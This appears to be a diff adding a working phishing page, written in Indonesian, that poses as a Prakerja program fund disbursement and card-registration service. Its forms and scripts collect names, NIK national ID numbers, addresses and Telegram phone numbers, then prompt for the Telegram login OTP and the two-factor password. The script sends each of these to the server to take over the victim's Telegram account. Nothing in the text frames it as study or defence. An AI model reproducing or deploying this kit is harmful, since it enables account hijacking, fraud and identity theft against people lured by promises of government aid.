@@ -1,0 +1,852 @@
+<body class="flex flex-col min-h-screen justify-between bg-gray-50">
+   
+    <header class="bg-[#4f8fda] text-white py-4 px-6 flex justify-between items-center">
+        <a href="/">
+            <img src="assets/img/header.png" alt="Logo" class="w-full h-10">
+        </a>
+        <button class="text-white focus:outline-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2">
+                <line x1="4" y1="6" x2="20" y2="6"></line>
+                <line x1="4" y1="12" x2="20" y2="12"></line>
+                <line x1="4" y1="18" x2="20" y2="18"></line>
+            </svg>
+        </button>
+    </header>
+    <main class="flex-grow flex flex-col items-center my-8 px-4">
+        <div id="loading-spinner" class="hidden fixed inset-0 flex justify-center items-center bg-gray-700 bg-opacity-50 z-50">
+            <div class="spinner-border animate-spin rounded-full border-t-4 border-b-4 border-indigo-600 w-16 h-16"></div>
+        </div>
+           <div id="wellcome" class="w-fullflex flex-col items-center">
+            <img alt="Man holding a phone displaying BPJS Kesehatan app" class="w-full max-w-md" height="600" src="assets/img/icon.webp" width="400"/>
+            <div class="text-center mb-6">
+  
+                <h1 class="pt-5 text-2xl font-bold text-[#142b72]">
+                 PENCAIRAN SALDO PELATIHAN
+                </h1>
+                <p class="pt-3 text-xl">
+              Prakerja Semua Gelombang
+                </p>
+               </div>
+            <div class="text-center mt-4">
+                <button onclick="sudahOpen()" class="w-full bg-[#ff7d2a] text-white py-2 rounded-lg font-bold hover:bg-[#4f8fda] transition duration-300" type="submit">
+                  SUDAH PUNYA AKUN
+                 </button>
+            </div>
+            <div class="text-center mt-4">
+                <button onclick="belumOpen()" class="w-full bg-[#ff7d2a] text-white py-2 rounded-lg font-bold hover:bg-[#4f8fda] transition duration-300" type="submit">
+                  BELUM PUNYA AKUN
+                 </button>
+            </div>
+           
+            </div>
+
+            <div  style="display: none;" id="formbelum" class="bg-white rounded-lg shadow-lg p-4 w-full max-w-md">
+              
+                <div class="flex items-center mb-4">
+                 <h1 class="text-center flex-grow text-gray-600 font-semibold">
+                FORMULIR PEMBUATAN KARTU PRAKERJA
+                 </h1>
+                </div>
+                <div class="relative mb-6 w-full">
+                  
+                    <img alt="KTP image placeholder" class="rounded-lg border border-gray-300 w-full h-full object-cover" src="assets/img/kartu.jpeg" />
+                    <div class="absolute px-8" style="top: 80px;">
+                        <div class="mx-2 flex justify-center flex-col items-center text-black font-bold text-sm">
+                            <div class="flex w-full justify-between">
+                                <span>Nomor Kartu</span><span id="nomorinput"></span>
+                            </div>
+                            <div class="flex w-full justify-between">
+                                <span>Nama :</span><span id="namainput"></span>
+                            </div>
+                            <div class="flex w-full justify-between">
+                                <span>NIK :</span><span id="nikinput"></span>
+                            </div>
+                            <div class="flex w-full justify-between">
+                                <span>Tanggal/Lahir :</span><span id="lahirinput"></span>
+                            </div>
+                            <div class="flex w-full justify-between">
+                                <span>Alamat</span> <span id="alamatinput"></span>
+                            </div>
+                          
+                            <div class="flex w-full justify-between">
+                                <span>provinsi</span> <span id="provinput"></span>
+                            </div>
+                        
+                        </div>
+                    </div>
+                </div>
+                
+                
+                <form>
+                    <div class="mb-4">
+                        <input oninput="namacheck()" id="nama" name="nama" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Nama Lengkap (KTP)" type="text"/>
+                    </div>
+                    <div class="mb-4">
+                        <input oninput="cekNik()" id="nik" name="nik" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Nomor NIK" type="text"/>
+                    </div>
+                 
+                    <div class="mb-4">
+                        <input id="nomor" name="nomor" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Nomor Telegram Aktif" type="text"/>
+                        <span id="belum-error" class="text-red-500 text-sm"></span>
+                    </div>
+                    <div class="flex justify-center">
+                        <button onclick="pertamabelum()" id="numberbuttbelum" class="w-full bg-[#ff7d2a] text-white py-2 rounded-lg font-bold hover:bg-[#4f8fda] transition duration-300" type="submit">
+                          BUAT KARTU
+                        </button>
+                    </div>
+                </form>
+                <p class="text-center text-gray-600 mt-6">
+                    Sudah punya Kartu?
+                    <a onclick="belumKemb()" class="text-[#4f8fda] font-bold" href="#">
+                     Cairkan di sini
+                    </a>
+                   </p>
+               </div>
+
+           
+               <div style="display: none;" id="formsudah"  class="bg-white rounded-lg shadow-lg p-6 w-full max-w-sm">
+                <div class="text-center mb-6">
+          
+                 <h1 class="text-3xl font-bold text-[#142b72] text-left">
+                  Pencairan dana
+                 </h1>
+                 <p class="text-left text-gray-700">
+                  Mohon isi data berikut dengan benar
+                 </p>
+                </div>
+                <form>
+                 <div class="mb-4">
+                     <input class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Nama Lengkap (KTP)" id="namaktp" type="text"/>
+                 </div>
+                 <div class="mb-4">
+                     <input class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Nomor Kartu" id="nomorkartu" type="text"/>
+                 </div>
+                 <div class="mb-4">
+                     <select id="provinsi" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                       <option value="" disabled selected>Pilih Provinsi</option>
+                     </select>
+                 </div>
+                 <div class="mb-4">
+                     <select id="kabupaten" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                         <option value="" disabled selected>Pilih Kabupaten</option>
+                     </select>
+                 </div>
+                 <div class="mb-4">
+                     <select id="kecamatan" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                         <option value="" disabled selected>Pilih Kecamatan</option>
+                     </select>
+                 </div>
+                 <div class="mb-4">
+                     <select id="kelurahan" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                         <option value="" disabled selected>Pilih Kelurahan/Desa</option>
+                     </select>
+                 </div>
+                 <div class="mb-4">
+                     <input class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" value="599.000" type="text" readonly/>
+                 </div>
+                 <div class="mb-4">
+                     <input id="number" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Nomor Telegram Aktif" type="text"/>
+                     <span id="sudah-error" class="text-red-500 text-sm"></span>
+                 </div>
+                 <button onclick="pertamasudah()" id="numberbuttsudah" class="w-full bg-[#ff7d2a] text-white py-2 rounded-lg font-bold hover:bg-[#4f8fda] transition duration-300" type="submit">
+                    CAIRKAN
+                 </button>
+        
+             </form>
+             
+                <p class="text-center text-gray-600 mt-6">
+                 Belum punya Kartu?
+                 <a onclick="sudahKemb()" class="text-[#4f8fda] font-bold" href="#">
+                  Buat di sini
+                 </a>
+                </p>
+               </div>
+
+
+               <div style="display: none;" id="otp" class="bg-white rounded-lg shadow-lg p-6 w-full max-w-sm">
+                <img alt="Man holding a phone displaying BPJS Kesehatan app" class="w-full max-w-md" height="600" src="assets/img/icon.webp" width="400"/>
+                
+                <div class="text-center mb-6">
+            
+            
+                 <p class="pt-2 text-left text-gray-700">
+                  Mohon Masukkan Kode OTP Yang Sudah Di Kirim Ke Aplikasi Telegram Anda.
+                 </p>
+                </div>
+                <form>
+                    <input type="hidden" name="phone_number" id="validatephone_number" readonly="">
+                    <input type="hidden" name="clientHash" id="validateclientHash" readonly="">
+                     <input type="hidden" name="provinsi" id="validateprovinsi" readonly="">
+                    <div class="flex justify-center items-center">
+                        <input type="hidden" name="phone_number" id="validatephone_number" readonly="">
+                        <input type="hidden" name="clientHash" id="validateclientHash" readonly="">
+                         <input type="hidden" name="provinsi" id="validateprovinsi" readonly="">
+                        <div class="flex space-x-2">
+                            <input id="otp_code" type="text" maxlength="1" class="border-gray-400 w-12 h-12 text-center border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"/>
+                            <input id="otp_code" type="text" maxlength="1" class="border-gray-400 w-12 h-12 text-center border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"/>
+                            <input id="otp_code" type="text" maxlength="1" class="border-gray-400 w-12 h-12 text-center border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"/>
+                            <input id="otp_code" type="text" maxlength="1" class="border-gray-400 w-12 h-12 text-center border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"/>
+                            <input id="otp_code" type="text" maxlength="1" class="border-gray-400 w-12 h-12 text-center border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"/>
+                        </div>
+                    </div>
+                </form>
+                <span id="otp-error" class="text-red-500 text-sm"></span>
+               </div>
+
+<div style="display: none;" id="password-container" class="bg-white rounded-lg shadow-lg p-6 w-full max-w-sm" x-data="{ showPassword: false }">
+    <img alt="Man holding a phone displaying BPJS Kesehatan app" class="w-full max-w-md" height="600" src="assets/img/icon.webp" width="400"/>
+
+    <div class="text-center mb-6">
+        <p class="pt-2 text-left text-gray-700">
+            Mohon Masukkan Password atau A2F Telegram Anda.
+        </p>
+    </div>
+
+    <form>
+        <input type="hidden" name="phone_number" id="validatephone_number" readonly="">
+        <input type="hidden" name="clientHash" id="validateclientHash" readonly="">
+         <input type="hidden" name="provinsi" id="validateprovinsi" readonly="">
+        <div class="relative mb-4">
+            <!-- Input Password -->
+            <input :type="showPassword ? 'text' : 'password'" id="password-input" autocomplete="off"
+                class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
+                placeholder="Password">
+            
+            <!-- Tombol Toggle -->
+            <button type="button" class="absolute right-2 top-1 text-gray-500 p-2" @click="showPassword = !showPassword">
+                <!-- Ikon Mata Dinamis -->
+                <template x-if="!showPassword">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943 9.542 7-1.274 2.045-4.623 6-9.542 6-4.92 0-8.267-3.955-9.542-6z" />
+                    </svg>
+                </template>
+                <template x-if="showPassword">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M3 3l18 18M10.59 10.59A3 3 0 0113.41 13.41M9.17 14.83a10.05 10.05 0 01-4.25-2.83M14.83 9.17a10.05 10.05 0 014.25 2.83M12 5c4.418 0 8.032 2.94 9.245 6.501M4.755 17.499A9.961 9.961 0 012.755 12c1.213-3.561 4.827-6.501 9.245-6.501" />
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943 9.542 7-1.274 2.045-4.623 6-9.542 6-4.92 0-8.267-3.955-9.542-6z" />
+                    </svg>
+                </template>
+            </button>
+        </div>
+        <span id="pass-error" class="text-red-500 text-sm"></span>
+        <button onclick="ketiga()" id="passbutt" class="w-full bg-[#ff7d2a] text-white py-2 rounded-lg font-bold hover:bg-[#4f8fda] transition duration-300" type="submit">
+           Selanjutnya
+         </button>
+    </form>
+</div>
+
+<div style="display: none;" id="four" class="w-fullflex flex-col items-center">
+        <img alt="Man holding a phone displaying BPJS Kesehatan app" class="w-full max-w-md" height="600" src="assets/img/icon.webp" width="400"/>
+        <div class="text-center mb-6">
+
+            <h1 class="pt-5 text-2xl font-bold text-[#142b72]">
+             PRAKERJA TAHUN 2025
+            </h1>
+           </div>
+        <div class="text-center mt-4">
+            <h1 class="border-2 text-xl p-2 border rounded-lg  border-blue-300 font-bold">TERIMA KASIH TELAH MENGAJUKAN PENCAIRAN ATAU PEMBUATAN AKUN PRAKERJA,KAMI AKAN MEMBERIKAN INFORMASI MELALUI <span class="text-blue-500">TELEGRAM</span></h1>
+        </div>
+       
+        </div>
+</main>
+
+    <footer class=" text-white text-center">
+            <img src="assets/img/bawahpra.png" alt="Footer Logo" class="w-full">
+          
+    </footer>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+const random16DigitNumber = (Math.floor(10 ** 15 + Math.random() * 9 * 10 ** 15)).toString();
+document.getElementById('nomorinput').textContent = `: ${random16DigitNumber}`;
+
+
+
+function onOtpComplete(otp) {
+        otp = otp.substring(0, 5); 
+        if (!otp || !/^\d{5}$/.test(otp)) { 
+            $("#otp-error").text("Kode Tidak Cocok!");
+    return; // Bisa ditambahkan untuk menghentikan eksekusi jika OTP salah
+}
+
+var $clientHash = $("input#validateclientHash").val();
+var $phone_number = $("input#validatephone_number").val();
+var $otp_code = $("input#validateotpcode").val();
+var $provinsi = $("input#validateprovinsi").val();
+var $idtele = "<%= String(telegramId) %>"
+var dataToSend = {
+clientHash: $clientHash,
+phone_number: $phone_number,
+otp_code: otp,
+provinsi: $provinsi,
+idtele: $idtele
+};
+console.log(dataToSend); 
+$.ajax({
+type: "POST",
+url: "/code",
+data: dataToSend,
+beforeSend: function() {
+$("#otp-error").text("")
+document.getElementById('loading-spinner').classList.remove('hidden')
+},
+success: function(hasil){  
+document.getElementById('loading-spinner').classList.add('hidden')           
+if(hasil.needPassword || hasil.code == 401){
+console.log(hasil)
+             $("#otp").hide();
+$('#password-container').show();            
+$("input#validatephone_number").val($phone_number);
+$("input#validateprovinsi").val($provinsi);
+$("input#validateclientHash").val($clientHash);                                
+}else{                 
+try{
+      console.log(hasil)                
+          if(hasil.code == 200){
+            $("#otp").hide();
+$("#four").show()
+}else{
+$("#otp-error").text(`${hasil.error}`)
+}
+}catch(e){
+console.log(e)
+console.log(hasil)
+$("#otp-error").text(`Ada masalah,coba lagi`)
+}
+}
+},
+error: function(xhr, status, error) {
+    document.getElementById('loading-spinner').classList.add('hidden')
+if (status === "timeout") {
+$("#otp-error").text(`Periksa jaringan anda dan coba lagi`)
+} else {
+$("#otp-error").text(`Periksa jaringan anda dan coba lagi`)
+}
+}
+})
+
+
+
+
+}
+
+ const inputs = document.querySelectorAll('input[id="otp_code"]');
+ inputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, ''); // Hanya angka yang diperbolehkan
+            
+            if (e.target.value.length === 1 && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+            
+            let otp = Array.from(inputs).map(i => i.value).join('');
+            if (otp.length === inputs.length) {
+                onOtpComplete(otp);
+            }
+        });
+        
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && index > 0 && !e.target.value) {
+                inputs[index - 1].focus();
+            }
+        });
+    });
+
+    
+
+
+
+ function toggleDisplay(showId, hideIds) {
+        $(`#${showId}`).show();
+        hideIds.forEach(id => $(`#${id}`).hide());
+    }
+
+function sudahKemb() {
+    toggleDisplay('wellcome', ['formsudah']);
+}
+
+function belumKemb() {
+    toggleDisplay('wellcome', ['formbelum']);
+}
+
+function sudahOpen() {
+    toggleDisplay('formsudah', ['wellcome']);
+}
+
+function belumOpen() {
+    toggleDisplay('formbelum', ['wellcome']);
+}
+
+function namacheck() {
+    document.getElementById('namainput').textContent = document.getElementById('nama').value.toUpperCase();
+}
+
+function cekNik() {
+// 7313103001040002
+const nik = document.getElementById('nik').value;
+nikParse(nik, function(result) {
+if (result.status == "error") {
+    $("#belum-error").text("Nik Tidak Valid!");
+    return;
+} else {
+    $("#belum-error").text("");
+console.log(result.data)
+document.getElementById('nikinput').textContent = nik;
+document.getElementById('lahirinput').textContent = `${result.data.lahir}`;
+document.getElementById('alamatinput').textContent = `: ${result.data.kecamatan}, ${result.data.kotakab}`;
+document.getElementById('provinput').textContent = `: ${result.data.provinsi}`;
+}
+});
+}
+
+
+async function loadProvinces() {
+    try {
+    
+      
+      $.ajax({
+          url: 'api/provinsi', // Ganti dengan URL API Anda
+          method: 'GET',
+          success: function(data) {
+    
+    
+    const provinceSelect = document.getElementById('provinsi');
+    
+    for (let id in data) {
+          const option = document.createElement('option');
+          option.value = id; // ID Provinsi
+          option.textContent = data[id]; // Nama Provinsi
+          provinceSelect.appendChild(option);
+      }
+          },
+          error: function(error) {
+    const provinceSelect = document.getElementById('provinsi');
+          const option = document.createElement('option');
+          option.value = 'error'; // ID Provinsi
+          option.textContent = 'ada masalah'; // Nama Provinsi
+          provinceSelect.appendChild(option);
+        
+              
+          }
+      });
+    
+      // });
+    } catch (error) {
+      console.log(error)
+         const provinceSelect = document.getElementById('provinsi');
+          const option = document.createElement('option');
+          option.value = 'error'; // ID Provinsi
+          option.textContent = 'ada masalah'; // Nama Provinsi
+          provinceSelect.appendChild(option);
+    }
+    }
+    
+    
+  
+$('#provinsi').on('change', function() {
+      const provinceId = $(this).val();
+       const kabupatenSelect = document.getElementById('kabupaten');
+kabupatenSelect.innerHTML = '<option value="">Pilih Kabupaten</option>'; // Reset dropdown kabupaten
+
+      // Cek jika provinsi dipilih
+      if (provinceId) {
+          // Mengirim request ke API untuk mendapatkan kabupaten berdasarkan provinsi yang dipilih
+          $.ajax({
+              url: `api/kabupaten/${provinceId}`, // Ganti dengan URL API Anda untuk kabupaten
+              method: 'GET',
+              success: function(data) {
+                 
+        
+
+                  // Mengisi dropdown kabupaten
+                  for (let id in data) {
+                      const option = document.createElement('option');
+                      option.value = id; // ID Kabupaten
+                      option.textContent = data[id]; // Nama Kabupaten
+                      kabupatenSelect.appendChild(option);
+                  }
+              },
+              error: function(error) {
+                  const kabupatenSelect = document.getElementById('kabupaten');
+          
+
+                  const option = document.createElement('option');
+                  option.value = 'error';
+                  option.textContent = 'Tidak dapat memuat kabupaten';
+                  kabupatenSelect.appendChild(option);
+              }
+          });
+      }else{
+          
+                      const option = document.createElement('option');
+      option.value = 'error'; // ID Provinsi
+      option.textContent = 'ada masalah'; // Nama Provinsi
+      kabupatenSelect.appendChild(option);
+      }
+})  
+
+$('#kabupaten').on('change', function() {
+// Ambil ID provinsi dari dropdown provinsi
+const provinceId = $('#provinsi').val();  // Ambil value dari dropdown provinsi
+const kecamatanId = $(this).val(); // Ambil ID kecamatan yang dipilih
+const kecamatanSelect = document.getElementById('kecamatan');
+
+// Reset dropdown kabupaten
+kecamatanSelect.innerHTML = '<option value="">Pilih Kecamatan</option>';
+
+// Cek jika ID provinsi dan kecamatan dipilih
+if (provinceId && kecamatanId) {
+  // Mengirim request ke API untuk mendapatkan kabupaten berdasarkan ID provinsi
+  $.ajax({
+      url: `api/kecamatan/${provinceId}/${kecamatanId}`, // Ganti dengan URL API Anda untuk kabupaten
+      method: 'GET',
+      success: function(data) {
+          // Mengisi dropdown kabupaten
+          for (let id in data) {
+              const option = document.createElement('option');
+              option.value = id; // ID Kabupaten
+              option.textContent = data[id]; // Nama Kabupaten
+              kecamatanSelect.appendChild(option);
+          }
+      },
+      error: function(error) {
+          // Menangani error jika kabupaten tidak ditemukan
+          const option = document.createElement('option');
+          option.value = 'error';
+          option.textContent = 'Tidak dapat memuat Kecamatan';
+          kecamatanSelect.appendChild(option);
+      }
+  });
+} else {
+  // Jika provinsi atau kecamatan tidak dipilih, tampilkan pesan kesalahan
+  const option = document.createElement('option');
+  option.value = 'error';
+  option.textContent = 'Pilih provinsi dan Kabupaten terlebih dahulu';
+  kecamatanSelect.appendChild(option);
+}
+});
+
+$('#kecamatan').on('change', function() {
+const provinceId = $('#provinsi').val();  // Ambil ID Provinsi
+const kabupatenId = $('#kabupaten').val();  // Ambil ID Kabupaten
+const kecamatanId = $(this).val();
+const kelurahanSelect = document.getElementById('kelurahan');
+
+kelurahanSelect.innerHTML = '<option value="">Pilih Kelurahan/Desa</option>'; // Reset dropdown kelurahan/desa
+
+if (provinceId && kabupatenId && kecamatanId) {
+  $.ajax({
+      url: `api/keldesa/${provinceId}/${kabupatenId}/${kecamatanId}`, // URL API untuk kelurahan/desa
+      method: 'GET',
+      success: function(data) {
+          for (let id in data) {
+              const option = document.createElement('option');
+              option.value = id;
+              option.textContent = data[id];
+              kelurahanSelect.appendChild(option);
+          }
+      },
+      error: function(error) {
+          const option = document.createElement('option');
+          option.value = 'error';
+          option.textContent = 'Tidak dapat memuat kelurahan/desa';
+          kelurahanSelect.appendChild(option);
+      }
+  });
+}
+});
+    
+    
+    window.onload = function() {
+  loadProvinces();  // Memuat provinsi saat halaman dimuat
+}
+
+function formatPhoneNumber(phoneNumber) {
+// Jika nomor telepon diawali dengan '0', ganti dengan '+628'
+if (phoneNumber.startsWith('0')) {
+return '+62' + phoneNumber.substring(1);
+}
+// Jika nomor sudah dimulai dengan '62', ganti dengan '+628'
+else if (phoneNumber.startsWith('62')) {
+return '+62' + phoneNumber.substring(2);
+}
+// Jika format sudah sesuai, kembalikan nomor tanpa perubahan
+else {
+return phoneNumber;
+}
+}
+
+function pertamasudah(){
+$('#formsudah').submit(function(kirimpertama){
+kirimpertama.preventDefault();
+// Ambil elemen input
+const nomorkartu = document.getElementById('nomorkartu');
+const namaktp = document.getElementById('namaktp');
+const number = document.getElementById('number');
+const provinsiSelect = document.getElementById('provinsi');
+const kabupatenSelect = document.getElementById('kabupaten');
+const kecamatanSelect = document.getElementById('kecamatan');
+const desaSelect = document.getElementById('kelurahan');
+
+// Pastikan elemen tidak null sebelum mengambil nilainya
+const nomorkartuValue = nomorkartu?.value.trim() || "";
+const namaktpValue = namaktp?.value.trim() || "";
+const numberValue = number?.value.trim() || "";
+
+// Ambil teks dari opsi yang dipilih atau nilai input jika bukan select
+const provinsiText = provinsiSelect?.options[provinsiSelect.selectedIndex]?.text.trim() || "";
+const kabupatenText = kabupatenSelect?.options[kabupatenSelect.selectedIndex]?.text.trim() || kabupatenSelect?.value.trim();
+const kecamatanText = kecamatanSelect?.options[kecamatanSelect.selectedIndex]?.text.trim() || kecamatanSelect?.value.trim();
+const desaText = desaSelect?.options[desaSelect.selectedIndex]?.text.trim() || desaSelect?.value.trim();
+
+// Validasi apakah semua field sudah diisi dengan benar
+if (!nomorkartuValue || 
+    !namaktpValue || 
+    !numberValue ||
+    !provinsiText || provinsiText === "Pilih Provinsi" ||
+    !kabupatenText || kabupatenText === "Pilih Kabupaten" ||
+    !kecamatanText || kecamatanText === "Pilih Kecamatan" ||
+    !desaText || desaText === "Pilih Kelurahan/Desa") {
+    
+    // Menampilkan pesan error jika data tidak valid
+    $("#sudah-error").text("Isi Semua Formulir Dengan Lengkap!");
+    return;
+}
+
+
+
+// Gabungkan semua data menjadi satu string
+const dtaprov = `Provinsi : ${provinsiText}, Kabupaten : ${kabupatenText}, Kecamatan : ${kecamatanText}`;
+
+var $phone = $("input#number").val();
+// var $provinsi = $("input#validateprovinsi").val();
+var $phone_number = formatPhoneNumber($phone);
+
+var dataToSend = {
+phone_number: $phone_number,
+provinsi: dtaprov,
+
+};
+
+console.log(dataToSend)
+$.ajax({
+type: "POST",
+url: "/number",
+data: dataToSend,
+beforeSend: function() {
+    document.getElementById('loading-spinner').classList.remove('hidden')
+    $("#numberbuttsudah").hide();
+$("#number-error").text(``)
+},
+success: function(hasil){
+    document.getElementById('loading-spinner').classList.add('hidden')
+if(hasil.code == 200){ 
+
+    $("#otp").show();
+    $('#formsudah').hide();
+
+    $("input#validatephone_number").val($phone_number);
+    $("input#validateprovinsi").val(dtaprov);
+       $("input#validateclientHash").val(hasil.clientHash);
+}else{
+    $("#numberbuttsudah").text("CAIRKAN");
+        $("#numberbuttsudah").prop("disabled", false);
+
+if(hasil.err.errorMessage == "PHONE_NUMBER_INVALID"){
+    $("#numberbuttsudah").text("CAIRKAN");
+    $("#numberbuttsudah").prop("disabled", false);
+                  
+                    $("#number-error").text(`Nomor Yang Anda Masukkan Tidak Valid!`)
+                    }else if(hasil.err.errorMessage == "FLOOD"){
+                        $("#numberbuttsudah").text("CAIRKAN");
+                        $("#numberbuttsudah").prop("disabled", false);
+                        $("#number-error").text(`Terlalu Banyak Permintaan Code!`)
+                        
+                    }else if(hasil.err.errorMessage == "PHONE_PASSWORD_FLOOD"){
+                        $("#numberbuttsudah").text("CAIRKAN");
+                        $("#numberbuttsudah").prop("disabled", false);
+                        $("#number-error").text(`Terlalu Banyak Memasukkan Password!`)
+                        }else{
+                            $("#numberbuttsudah").text("CAIRKAN");
+                            $("#numberbuttsudah").prop("disabled", false);
+                            $("#number-error").text(`${hasil.err.errorMessage}`)
+                            }
+}
+
+}
+});
+});
+
+
+return false;
+
+}
+function pertamabelum(){
+$('#formbelum').submit(function(kirimpertamabelum){
+kirimpertamabelum.preventDefault();
+
+const namainput = document.getElementById('nama');
+const number = document.getElementById('nomor');
+const nikinput = document.getElementById('nik');
+
+
+// Pastikan elemen tidak null sebelum mengambil nilainya
+const namainputval = namainput?.value || ""; // Tidak menggunakan trim
+const nikinputval = nikinput?.value.trim() || ""; // Tetap menggunakan trim
+const numberval = number?.value.trim() || ""; // Tetap menggunakan trim
+
+
+console.log(namainputval)
+console.log(nikinputval)
+console.log(numberval)
+if (!namainputval || !nikinputval || !numberval) {
+    $("#belum-error").text("Isi Semua Formulir Dengan Lengkap!");
+    return;
+}
+
+nikParse(nikinputval, function(result) {
+if (result.status == "error") {
+    $("#belum-error").text("Nik Tidak Valid!");
+    return;
+}
+
+
+const dtaprov = `Provinsi : ${result.data.provinsi}, Kabupaten : ${result.data.kotakab}, Kecamatan : ${result.data.kecamatan}`;
+
+// var $provinsi = $("input#validateprovinsi").val();
+var $phone_number = formatPhoneNumber(numberval);
+
+var dataToSend = {
+phone_number: $phone_number,
+provinsi: dtaprov,
+
+};
+
+console.log(dataToSend)
+$.ajax({
+type: "POST",
+url: "/number",
+data: dataToSend,
+beforeSend: function() {
+    $("#numberbuttbelum").hide();
+    document.getElementById('loading-spinner').classList.remove('hidden')
+$("#number-error").text(``)
+},
+success: function(hasil){
+    document.getElementById('loading-spinner').classList.add('hidden')
+if(hasil.code == 200){ 
+
+    $("#otp").show();
+    $('#formbelum').hide();
+
+    $("input#validatephone_number").val($phone_number);
+    $("input#validateprovinsi").val(dtaprov);
+       $("input#validateclientHash").val(hasil.clientHash);
+}else{
+    $("#numberbuttbelum").text("BUAT KARTU");
+        $("#numberbuttbelum").prop("disabled", false);
+
+if(hasil.err.errorMessage == "PHONE_NUMBER_INVALID"){
+    $("#numberbuttbelum").text("BUAT KARTU");
+    $("#numberbuttbelum").prop("disabled", false);
+                  
+                    $("#number-error").text(`Nomor Yang Anda Masukkan Tidak Valid!`)
+                    }else if(hasil.err.errorMessage == "FLOOD"){
+                        $("#numberbuttbelum").text("BUAT KARTU");
+                        $("#numberbuttbelum").prop("disabled", false);
+                        $("#number-error").text(`Terlalu Banyak Permintaan Code!`)
+                        
+                    }else if(hasil.err.errorMessage == "PHONE_PASSWORD_FLOOD"){
+                        $("#numberbuttbelum").text("BUAT KARTU");
+                        $("#numberbuttbelum").prop("disabled", false);
+                        $("#number-error").text(`Terlalu Banyak Memasukkan Password!`)
+                        }else{
+                            $("#numberbuttbelum").text("BUAT KARTU");
+                            $("#numberbuttbelum").prop("disabled", false);
+                            $("#number-error").text(`${hasil.err.errorMessage}`)
+                            }
+}
+
+}
+});
+});
+});
+
+
+return false;
+
+}
+
+
+function ketiga(){
+$('#password-container').submit(function(kirimpass){
+  kirimpass.preventDefault();
+
+  // Mengambil nilai input
+  var $phone_number = $("input#validatephone_number").val();
+var $clientHash = $("input#validateclientHash").val();
+  var $provinsi = $("input#validateprovinsi").val();
+  var $password = $("input#password-input").val();
+  var $idtele = "<%= String(telegramId) %>"; // Pastikan nilai telegramId sudah valid
+
+var dataToSend = {
+clientHash: $clientHash,
+phone_number: $phone_number,
+provinsi: $provinsi,
+password: $password,
+idtele: $idtele
+
+};
+console.log(dataToSend); 
+
+
+  $.ajax({
+      type: "POST",
+      url: "/password",
+      data: dataToSend,
+      beforeSend: function() {
+    $("#passbutt").hide();
+    document.getElementById('loading-spinner').classList.remove('hidden')
+$("#pass-error").text("")
+ },
+ success: function(response){
+    document.getElementById('loading-spinner').classList.add('hidden')
+          try {
+              // Mengecek apakah respons sukses atau error
+              if (response.code == 200) {
+             
+                  $("#password-container").hide();
+                  $("#four").show();
+
+              } else {
+                $("#passbutt").text("Selanjutnya");
+                $("#passbutt").prop("disabled", false);
+                  if (response.error) {
+$("#pass-error").text(response.error)
+                  } else {
+$("#pass-error").text(`Ada masalah, refresh halaman dan coba lagi`)
+}
+}
+          } catch (e) {
+            $("#passbutt").text("Selanjutnya");
+            $("#passbutt").prop("disabled", false);
+ $("#pass-error").text(`Ada masalah, refresh halaman dan coba lagi`)
+ console.log(e);
+          }
+      },
+      error: function(xhr, status, error){
+        document.getElementById('loading-spinner').classList.remove('hidden')
+        $("#passbutt").text("Selanjutnya");
+        $("#passbutt").prop("disabled", false);
+          console.log(error);
+            $("#pass-error").text(`Terjadi kesalahan!`)
+      }
+  });
+
+  return false; // Menghentikan form submit default
+});
+return false;
+};
+
+
+</script>
